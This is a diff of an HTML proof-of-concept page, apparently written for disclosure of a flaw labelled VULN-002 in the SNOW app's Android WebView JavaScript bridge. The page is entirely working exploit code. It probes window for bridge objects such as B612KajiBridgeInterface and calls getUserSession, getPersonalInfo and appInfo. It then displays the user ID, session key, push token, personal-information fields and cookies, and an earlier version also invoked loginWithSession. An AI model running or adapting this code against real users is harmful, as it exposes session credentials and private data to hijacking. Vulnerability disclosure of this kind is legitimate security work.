@@ -5,105 +5,71 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <style>
-body{background:#111;color:#0f0;font-family:monospace;font-size:12px;padding:10px;word-break:break-all}
-.r{color:#ff0;font-weight:bold;display:block;margin-top:6px}
-.v{color:#0ff}
-.e{color:#f44}
-.ok{color:#0f0}
+body{background:#111;color:#eee;font-family:monospace;font-size:13px;padding:14px;word-break:break-all}
+.t{color:#f85149;font-weight:bold;font-size:15px;display:block;margin-bottom:12px}
+.s{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:10px;margin-bottom:10px}
+.k{color:#e3b341;min-width:130px;display:inline-block}
+.v{color:#79c0ff}
+.hi{color:#f85149;font-weight:bold}
+.ok{color:#3fb950;font-weight:bold}
+.sub{color:#8b949e;font-size:11px;display:block;margin-top:4px}
 </style>
 </head>
 <body>
-<span class="r">== SNOW Bridge PoC ==</span>
-<div id="o"><span class="v">init...</span></div>
+<span class="t">⚠ VULN-002 PoC: JS Bridge 개인정보 노출</span>
+<div id="o"></div>
 <script>
 var o = document.getElementById('o');
-var log = function(k, v, cls) {
-  o.innerHTML += '<span class="r">[' + k + ']</span><span class="' + (cls||'v') + '">' + String(v) + '</span>';
-};
-
-function scan() {
-  // 1. window 전체 스캔 — Bridge 탐색
-  var found = [];
-  var keywords = ['bridge','Bridge','android','Android','kaji','Kaji','snow','Snow','interface','Interface'];
-  try {
-    for (var k in window) {
-      try {
-        if (typeof window[k] === 'object' && window[k] !== null && window[k] !== window) {
-          var lk = k.toLowerCase();
-          if (keywords.some(function(w){return lk.indexOf(w.toLowerCase())>=0;})) {
-            found.push(k);
-          }
-        }
-      } catch(e) {}
-    }
-  } catch(e) {}
-
-  log('window scan', found.length ? found.join(', ') : '(none)', found.length ? 'ok' : 'e');
-
-  // 2. 직접 Bridge 이름 체크
-  var names = ['B612KajiBridgeInterface','AndroidBridge','androidBridge',
-                'snowBridge','SnowBridge','kajiBridge','KajiBridge',
-                'b612','B612','nativeInterface'];
-  var bridge = null, bname = null;
-  names.forEach(function(n){
-    var exists = false;
-    try { exists = typeof window[n] !== 'undefined'; } catch(e){}
-    log('typeof ' + n, typeof window[n], exists ? 'ok' : 'e');
-    if (exists && !bridge) { bridge = window[n]; bname = n; }
-  });
-
-  if (!bridge) {
-    log('RESULT', 'Bridge NOT found — 재시도 중...', 'e');
-    return false;
-  }
-
-  // 3. Bridge 발견
-  log('BRIDGE FOUND', bname, 'ok');
-
-  // 4. 메서드 실행
-  try { log('getUserSession', bridge.getUserSession(), 'v'); }
-  catch(e) { log('getUserSession_ERR', e, 'e'); }
-
-  try { log('getPersonalInfo', bridge.getPersonalInfo(), 'v'); }
-  catch(e) { log('getPersonalInfo_ERR', e, 'e'); }
-
-  try { log('appInfo', bridge.appInfo(), 'v'); }
-  catch(e) { log('appInfo_ERR', e, 'e'); }
-
-  log('cookie', document.cookie || '(empty)');
-
-  try {
-    bridge.loginWithSession(function(r){
-      log('loginWithSession', r, 'ok');
-      log('cookie_after', document.cookie || '(empty)');
-    });
-  } catch(e) { log('loginWithSession_ERR', e, 'e'); }
-
-  // 5. 전체 메서드 목록
-  try {
-    var ms = [];
-    for (var m in bridge) {
-      try { if (typeof bridge[m]==='function') ms.push(m); } catch(ee){}
-    }
-    log('methods(' + ms.length + ')', ms.join(', ') || '(none)');
-  } catch(e) {}
-
-  return true;
+function row(k, v, hi) {
+  o.innerHTML += '<div class="s"><span class="k">' + k + '</span><span class="' + (hi?'hi':'v') + '">' + v + '</span></div>';
 }
 
-// 즉시 실행
-var done = scan();
+// Bridge 탐색
+var b = null;
+['B612KajiBridgeInterface','AndroidBridge','androidBridge'].forEach(function(n){
+  try { if(!b && typeof window[n]!=='undefined') b=window[n]; } catch(e){}
+});
 
-// 실패 시 재시도 (0.5s, 1s, 2s, 3s)
-if (!done) {
-  [500, 1000, 2000, 3000].forEach(function(t) {
-    setTimeout(function() {
-      if (!done) {
-        o.innerHTML += '<span class="r">[retry ' + t + 'ms]</span>';
-        done = scan();
-      }
-    }, t);
-  });
+if (!b) {
+  o.innerHTML = '<div class="s"><span class="hi">Bridge NOT FOUND</span><span class="sub">SNOW WebView 컨텍스트에서 실행해야 합니다</span></div>';
+} else {
+  row('Bridge', 'B612KajiBridgeInterface FOUND', true);
+
+  // 1. getUserSession — 세션 정보
+  try {
+    var s = JSON.parse(b.getUserSession()) || {};
+    row('userId',          s.userId||'', true);
+    row('userOid',         s.userOid||'', true);
+    row('name',            s.name||'(없음)');
+    row('availableReward', s.availableReward, true);
+    row('isVIP',           String(s.isVIP));
+    row('sessionKey',      s.sessionKey ? s.sessionKey.substr(0,50)+'...' : '', true);
+    row('xColor',          s.xColor    ? s.xColor.substr(0,50)+'...'    : '', true);
+    row('pushToken',       s.pushToken ? s.pushToken.substr(0,60)+'...' : '', true);
+  } catch(e) { row('getUserSession ERR', e, false); }
+
+  // 2. getPersonalInfo — 개인정보
+  try {
+    var p = b.getPersonalInfo();
+    row('getPersonalInfo', p || '(empty)', true);
+    if (p) {
+      try {
+        var pj = JSON.parse(p);
+        Object.keys(pj).forEach(function(k){
+          if(pj[k]) row('  └ '+k, String(pj[k]), true);
+        });
+      } catch(e) {}
+    }
+  } catch(e) { row('getPersonalInfo ERR', e, false); }
+
+  // 3. appInfo — 앱/기기 정보
+  try {
+    var a = b.appInfo();
+    row('appInfo', a || '(empty)');
+  } catch(e) { row('appInfo ERR', e, false); }
+
+  // 4. Cookie
+  row('document.cookie', document.cookie || '(empty)', !!document.cookie);
 }
 </script>
 </body>
